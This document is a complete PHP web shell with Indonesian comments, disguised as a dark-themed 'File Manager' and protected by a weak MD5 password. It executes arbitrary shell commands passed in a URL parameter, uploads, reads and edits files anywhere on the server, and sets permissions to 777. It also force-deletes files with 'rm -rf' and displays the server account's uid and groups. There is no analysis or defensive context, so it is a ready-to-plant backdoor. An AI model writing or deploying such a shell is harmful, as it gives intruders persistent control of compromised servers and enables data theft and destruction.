<?php
// ========== CEK USER & GROUP ==========
$user_info = array(
    'user' => get_current_user(),
    'uid' => getmyuid(),
    'gid' => getmygid(),
    'groups' => function_exists('posix_getgroups') ? posix_getgroups() : 'N/A'
);

// ========== PASSWORD CONFIG ==========
$pass_hash = 'f0acdf779e440d2748d9cf57f1b9b3f6'; // MD5 dari 'admin123'

session_start();

// ========== LOGIN CHECK ==========
if (isset($_POST['p']) && md5($_POST['p']) === $pass_hash) {
    $_SESSION['auth'] = true;
}

if (!isset($_SESSION['auth'])) {
    echo '<!DOCTYPE html>
    <html>
    <head>
        <style>
            body{background:#0a0e12;color:#0f0;font-family:monospace;padding:20px;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
            .login-box{background:#1a1f2e;padding:40px;border-radius:12px;border:1px solid #0f0;text-align:center;}
            input{background:#0a0e12;color:#0f0;border:1px solid #0f0;padding:12px 20px;border-radius:6px;font-size:16px;width:250px;}
            button{background:#0f0;color:#000;border:none;padding:12px 30px;border-radius:6px;font-weight:bold;cursor:pointer;font-size:16px;}
            button:hover{background:#0f0;opacity:0.8;}
            h2{color:#0f0;margin-bottom:20px;}
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔐 Login</h2>
            <form method="post">
                <input type="password" name="p" placeholder="Password" autofocus><br><br>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>';
    exit;
}

// ========== LOGOUT ==========
if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ========== MAIN CODE ==========
$cwd = isset($_GET['d']) ? $_GET['d'] : getcwd();
$home = getcwd();

// ========== FORCE DELETE FUNCTION ==========
function force_delete($path) {
    if (!file_exists($path)) return true;
    
    // Force chmod 777 dulu
    @chmod($path, 0777);
    
    if (is_dir($path)) {
        // Coba pake system command dulu (lebih ampuh)
        if (function_exists('exec')) {
            exec('rm -rf "' . addslashes($path) . '" 2>&1', $o, $r);
            if ($r === 0 && !file_exists($path)) return true;
        }
        if (function_exists('system')) {
            system('rm -rf "' . addslashes($path) . '" 2>&1', $r);
            if ($r === 0 && !file_exists($path)) return true;
        }
        
        // Manual recursive
        $files = @scandir($path);
        if ($files) {
            foreach ($files as $f) {
                if ($f == '.' || $f == '..') continue;
                $p = $path . '/' . $f;
                @chmod($p, 0777);
                if (is_dir($p)) {
                    force_delete($p);
                } else {
                    @chmod($p, 0777);
                    @unlink($p);
                    // Kalo masih ada, paksa pake file_put_contents
                    if (file_exists($p)) {
                        @file_put_contents($p, '');
                        @unlink($p);
                    }
                }
            }
        }
        @chmod($path, 0777);
        @rmdir($path);
        
        // Last resort
        if (file_exists($path) && function_exists('exec')) {
            exec('rm -rf "' . addslashes($path) . '" 2>&1');
        }
        return !file_exists($path);
    } else {
        @chmod($path, 0777);
        @unlink($path);
        if (file_exists($path)) {
            @file_put_contents($path, '');
            @unlink($path);
        }
        return !file_exists($path);
    }
}

// ========== FUNGSI TAMPILAN HASIL ==========
function show_result($title, $message, $cwd, $home) {
    echo '<!DOCTYPE html>
    <html>
    <head>
        <style>
            body{background:#0a0e12;color:#0f0;font-family:monospace;padding:20px;}
            a{color:#0f0;text-decoration:none;}
            .btn{background:#1a1f2e;padding:8px 16px;border:1px solid #0f0;border-radius:4px;text-decoration:none;display:inline-block;margin:5px;}
            .btn:hover{background:#0f0;color:#000;}
            .msg{font-size:18px;padding:20px 0;}
        </style>
    </head>
    <body>
        <h3>' . $title . '</h3>
        <hr>
        <div class="msg">' . $message . '</div>
        <hr>
        <a href="?d=' . urlencode($cwd) . '" class="btn">⬅ Back</a>
        <a href="?d=' . urlencode($home) . '" class="btn">🏠 Home</a>
    </body>
    </html>';
    exit;
}

// ========== ACTION: CMD ==========
if (isset($_GET['cmd'])) { 
    $cmd = $_GET['cmd'];
    echo "<!DOCTYPE html><html><head><style>body{background:#0a0e12;color:#0f0;font-family:monospace;padding:20px;}a{color:#0f0;text-decoration:none;}.btn{background:#1a1f2e;padding:8px 16px;border:1px solid #0f0;border-radius:4px;text-decoration:none;display:inline-block;margin:5px;}.btn:hover{background:#0f0;color:#000;}</style></head><body>";
    echo "<h3>▶ Command: " . htmlspecialchars($cmd) . "</h3><hr>";
    echo "<pre>";
    if (function_exists('system')) { system($cmd); }
    elseif (function_exists('exec')) { exec($cmd, $o); echo implode("\n", $o); }
    elseif (function_exists('shell_exec')) { echo shell_exec($cmd); }
    elseif (function_exists('passthru')) { passthru($cmd); }
    echo "</pre>";
    echo '<hr>';
    echo '<a href="?d=' . urlencode($cwd) . '" class="btn">⬅ Back</a>';
    echo '<a href="?d=' . urlencode($home) . '" class="btn">🏠 Home</a>';
    echo "</body></html>";
    exit; 
}

// ========== ACTION: UPLOAD ==========
if (isset($_FILES['f'])) { 
    $target = $cwd.'/'.basename($_FILES['f']['name']);
    if (@move_uploaded_file($_FILES['f']['tmp_name'], $target)) {
        @chmod($target, 0777);
        $msg = "✅ Uploaded: " . htmlspecialchars($_FILES['f']['name']);
    } else {
        $msg = "❌ Upload failed!";
    }
    show_result("📤 Upload", $msg, $cwd, $home);
}

// ========== ACTION: DELETE (POST) ==========
if (isset($_POST['del'])) { 
    $t=$cwd.'/'.base64_decode($_POST['del']); 
    if(file_exists($t)) {
        if (force_delete($t)) {
            $msg = "✅ Deleted: " . htmlspecialchars(base64_decode($_POST['del']));
        } else {
            $msg = "❌ Failed to delete: " . htmlspecialchars(base64_decode($_POST['del']));
        }
    } else {
        $msg = "❌ Not found!";
    }
    show_result("🗑️ Delete", $msg, $cwd, $home);
}

// ========== ACTION: MKDIR ==========
if (isset($_GET['mkdir'])) { 
    $name = $_GET['mkdir'];
    if (@mkdir($cwd.'/'.$name, 0777, true)) {
        @chmod($cwd.'/'.$name, 0777);
        $msg = "✅ Folder created: " . htmlspecialchars($name);
    } else {
        $msg = "❌ Failed to create folder!";
    }
    show_result("📁 Create Folder", $msg, $cwd, $home);
}

// ========== ACTION: CREATE FILE ==========
if (isset($_POST['create_file'])) {
    $name = $_POST['filename'];
    $file = $cwd.'/'.$name;
    if (!file_exists($file)) {
        @file_put_contents($file, $_POST['content'] ?? '');
        @chmod($file, 0777);
        $msg = "✅ File created: " . htmlspecialchars($name);
    } else {
        $msg = "❌ File already exists: " . htmlspecialchars($name);
    }
    show_result("📄 Create File", $msg, $cwd, $home);
}

// ========== ACTION: SAVE FILE ==========
if (isset($_POST['save'], $_POST['c'])) { 
    $name = $_POST['save'];
    if (@file_put_contents($cwd.'/'.$name, $_POST['c'])) {
        @chmod($cwd.'/'.$name, 0777);
        $msg = "✅ File saved: " . htmlspecialchars($name);
    } else {
        $msg = "❌ Failed to save file!";
    }
    show_result("💾 Save File", $msg, $cwd, $home);
}

// ========== ACTION: READ FILE ==========
if (isset($_GET['read'])) { 
    $content = @file_get_contents($cwd.'/'.$_GET['read']);
    echo "<!DOCTYPE html><html><head><style>body{background:#0a0e12;color:#0f0;font-family:monospace;padding:20px;}a{color:#0f0;text-decoration:none;}.btn{background:#1a1f2e;padding:8px 16px;border:1px solid #0f0;border-radius:4px;text-decoration:none;display:inline-block;margin:5px;}.btn:hover{background:#0f0;color:#000;}</style></head><body>";
    echo "<h3>📄 Reading: " . htmlspecialchars($_GET['read']) . "</h3><hr>";
    echo "<pre>" . htmlspecialchars($content) . "</pre>";
    echo '<hr>';
    echo '<a href="?d=' . urlencode($cwd) . '" class="btn">⬅ Back</a>';
    echo '<a href="?d=' . urlencode($home) . '" class="btn">🏠 Home</a>';
    echo "</body></html>";
    exit; 
}

// ========== ACTION: DELETE FILE/FOLDER (POST) ==========
if (isset($_POST['delete'])) {
    $name = base64_decode($_POST['delete']);
    $target = $cwd.'/'.$name;
    if (file_exists($target)) {
        if (force_delete($target)) {
            $msg = "✅ Deleted: " . htmlspecialchars($name);
        } else {
            $msg = "❌ Failed to delete: " . htmlspecialchars($name);
        }
    } else {
        $msg = "❌ Not found: " . htmlspecialchars($name);
    }
    show_result("🗑️ Delete", $msg, $cwd, $home);
}

// ========== ACTION: CHMOD ==========
if (isset($_POST['chmod'])) {
    $name = base64_decode($_POST['chmod']);
    $target = $cwd.'/'.$name;
    $perms = isset($_POST['perms']) ? octdec($_POST['perms']) : 0755;
    if (file_exists($target)) {
        if (@chmod($target, $perms)) {
            $msg = "✅ Chmod changed to " . decoct($perms) . " for: " . htmlspecialchars($name);
        } else {
            $msg = "❌ Chmod failed for: " . htmlspecialchars($name);
        }
    } else {
        $msg = "❌ Not found: " . htmlspecialchars($name);
    }
    show_result("🔓 Chmod", $msg, $cwd, $home);
}

// ========== INTERFACE ==========
$items = @scandir($cwd);
if (!$items) { $items = []; }

// Pisahkan folder dan file
$folders = [];
$files = [];
foreach ($items as $i) {
    if ($i == '.' || $i == '..') continue;
    $p = $cwd . '/' . $i;
    if (is_dir($p)) {
        $folders[] = $i;
    } else {
        $files[] = $i;
    }
}
sort($folders);
sort($files);
?>
<html>
<head>
    <title>File Manager</title>
    <style>
        body{background:#0a0e12;color:#0f0;font-family:monospace;padding:20px;}
        a{color:#0f0;text-decoration:none;}
        a:hover{color:#ff0;}
        input,button{background:#1a1f2e;color:#0f0;border:1px solid #0f0;padding:5px 10px;border-radius:4px;}
        button{background:#0f0;color:#000;cursor:pointer;font-weight:bold;}
        .btn-red{background:red;color:#fff;border:none;}
        .btn-blue{background:#0af;color:#000;border:none;}
        table{width:100%;border-collapse:collapse;}
        td{padding:5px;border-bottom:1px solid #333;}
        .folder{color:#ff0;font-weight:bold;}
        .file{color:#0f0;}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:999;}
        .modal-content{background:#0a0e12;margin:5% auto;padding:20px;width:80%;border-radius:8px;border:1px solid #0f0;}
        textarea{width:100%;height:200px;background:#111;color:#0f0;border:1px solid #0f0;}
        .close{float:right;cursor:pointer;color:#f00;font-size:24px;}
        .toolbar{display:flex;flex-wrap:wrap;gap:10px;margin:10px 0;}
        .toolbar input{flex:1;min-width:100px;}
        .chmod-form{display:inline-flex;gap:5px;align-items:center;}
        .chmod-form input[type=text]{width:50px;padding:2px 5px;}
        .chmod-form button{padding:2px 8px;font-size:11px;}
        .logout{float:right;background:#f00;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-weight:bold;}
        .logout:hover{background:#c00;}
        .btn{background:#1a1f2e;padding:5px 15px;border:1px solid #0f0;border-radius:4px;text-decoration:none;display:inline-block;}
        .btn:hover{background:#0f0;color:#000;}
    </style>
</head>
<body>
<div class="container">
    <div style="display:flex;justify-content:space-between;align-items:center;">
        <h2>📁 <?= htmlspecialchars($cwd) ?></h2>
        <form method="post">
            <input type="hidden" name="logout" value="1">
            <button type="submit" class="logout">🚪 Logout</button>
        </form>
    </div>

    <!-- ===== USER INFO ===== -->
    <div style="background:#1a1f2e;padding:10px;border-radius:8px;border:1px solid #0f0;margin:10px 0;font-size:14px;">
        <strong>👤 User Info:</strong><br>
        User: <?= $user_info['user'] ?><br>
        UID: <?= $user_info['uid'] ?> | GID: <?= $user_info['gid'] ?><br>
        <?php if (is_array($user_info['groups'])): ?>
        Groups: <?= implode(', ', $user_info['groups']) ?>
        <?php else: ?>
        Groups: <?= $user_info['groups'] ?>
        <?php endif; ?>
    </div>
    
    <!-- ===== TOOLBAR ===== -->
    <div class="toolbar">
        <form method="get" style="flex:2">
            <input type="text" name="cmd" placeholder="Command" style="width:60%">
            <input type="hidden" name="d" value="<?= htmlspecialchars($cwd) ?>">
            <button type="submit">▶ Run</button>
        </form>
        
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="f" style="display:inline;width:auto;">
            <input type="hidden" name="d" value="<?= htmlspecialchars($cwd) ?>">
            <button type="submit">⬆ Upload</button>
        </form>
        
        <form method="get">
            <input type="text" name="mkdir" placeholder="New Folder" style="width:120px;">
            <input type="hidden" name="d" value="<?= htmlspecialchars($cwd) ?>">
            <button type="submit">📁 Create</button>
        </form>
        
        <form method="post" style="display:inline">
            <input type="text" name="filename" placeholder="file.txt" style="width:120px;">
            <input type="hidden" name="create_file" value="1">
            <input type="hidden" name="d" value="<?= htmlspecialchars($cwd) ?>">
            <button type="submit">📄 Create File</button>
        </form>
        
        <a href="?d=<?= urlencode(dirname($cwd)) ?>" class="btn">⬆ Parent</a>
        <a href="?d=<?= urlencode($home) ?>" class="btn">🏠 Home</a>
    </div>
    <hr>

    <!-- ===== FOLDER LIST ===== -->
    <h3>📁 Folders</h3>
    <table>
        <tr><th>Name</th><th>Perms</th><th>Owner</th><th>Actions</th></tr>
        <?php foreach ($folders as $i): 
            $p = "$cwd/$i";
            $perms = substr(sprintf('%o', fileperms($p)), -4);
            $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($p))['name'] : fileowner($p);
            $b64 = base64_encode($i);
        ?>
        <tr>
            <td><a href="?d=<?= urlencode(realpath($p)) ?>" class="folder">📁 <?= htmlspecialchars($i) ?></a></td>
            <td><?= $perms ?></td>
            <td><?= $owner ?></td>
            <td>
                <form method="post" class="chmod-form" style="display:inline-flex;gap:3px;align-items:center;">
                    <input type="text" name="perms" value="<?= $perms ?>" size="4" style="width:45px;padding:2px 4px;">
                    <input type="hidden" name="chmod" value="<?= $b64 ?>">
                    <input type="hidden" name="d" value="<?= htmlspecialchars($cwd) ?>">
                    <button type="submit" style="background:#0af;color:#000;border:none;padding:2px 6px;border-radius:3px;font-size:11px;">🔓</button>
                </form>
                <form method="post" style="display:inline" onsubmit="return confirm('Delete folder <?= addslashes($i) ?>?')">
                    <input type="hidden" name="d" value="<?= htmlspecialchars($cwd) ?>">
                    <input type="hidden" name="delete" value="<?= $b64 ?>">
                    <button type="submit" style="background:red;color:#fff;border:none;padding:2px 8px;border-radius:4px;">🗑️</button>
                </form>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>

    <!-- ===== FILE LIST ===== -->
    <h3>📄 Files</h3>
    <table>
        <tr><th>Name</th><th>Size</th><th>Perms</th><th>Owner</th><th>Actions</th></tr>
        <?php foreach ($files as $i): 
            $p = "$cwd/$i";
            $size = is_file($p) ? number_format(filesize($p)).' B' : '-';
            $perms = substr(sprintf('%o', fileperms($p)), -4);
            $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($p))['name'] : fileowner($p);
            $b64 = base64_encode($i);
        ?>
        <tr>
            <td><a href="?read=<?= urlencode($i) ?>&d=<?= urlencode($cwd) ?>" class="file">📄 <?= htmlspecialchars($i) ?></a></td>
            <td><?= $size ?></td>
            <td><?= $perms ?></td>
            <td><?= $owner ?></td>
            <td>
                <form method="post" class="chmod-form" style="display:inline-flex;gap:3px;align-items:center;">
                    <input type="text" name="perms" value="<?= $perms ?>" size="4" style="width:45px;padding:2px 4px;">
                    <input type="hidden" name="chmod" value="<?= $b64 ?>">
                    <input type="hidden" name="d" value="<?= htmlspecialchars($cwd) ?>">
                    <button type="submit" style="background:#0af;color:#000;border:none;padding:2px 6px;border-radius:3px;font-size:11px;">🔓</button>
                </form>
                <a href="?read=<?= urlencode($i) ?>&d=<?= urlencode($cwd) ?>" style="color:#0af">👁️</a>
                <form method="post" style="display:inline">
                    <input type="hidden" name="d" value="<?= htmlspecialchars($cwd) ?>">
                    <input type="hidden" name="edit_file" value="<?= $b64 ?>">
                    <button type="submit" style="background:#ff0;color:#000;border:none;padding:2px 8px;border-radius:4px;">✏️</button>
                </form>
                <form method="post" style="display:inline" onsubmit="return confirm('Delete <?= addslashes($i) ?>?')">
                    <input type="hidden" name="d" value="<?= htmlspecialchars($cwd) ?>">
                    <input type="hidden" name="delete" value="<?= $b64 ?>">
                    <button type="submit" style="background:red;color:#fff;border:none;padding:2px 8px;border-radius:4px;">🗑️</button>
                </form>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>
</div>

<!-- ===== EDITOR MODAL ===== -->
<?php if (isset($_POST['edit_file']) && $_POST['edit_file']): 
    $file = $cwd.'/'.base64_decode($_POST['edit_file']);
    $content = @file_get_contents($file);
?>
<div class="modal" style="display:block;">
    <div class="modal-content">
        <span class="close" onclick="this.parentElement.parentElement.style.display='none'">&times;</span>
        <h3>✏️ Editing: <?= htmlspecialchars(basename($file)) ?></h3>
        <form method="post">
            <textarea name="c"><?= htmlspecialchars($content) ?></textarea>
            <input type="hidden" name="save" value="<?= htmlspecialchars(basename($file)) ?>">
            <input type="hidden" name="d" value="<?= htmlspecialchars($cwd) ?>">
            <button type="submit">💾 Save</button>
            <button type="button" onclick="this.form.parentElement.style.display='none'">Cancel</button>
        </form>
    </div>
</div>
<?php endif; ?>

</body>
</html>
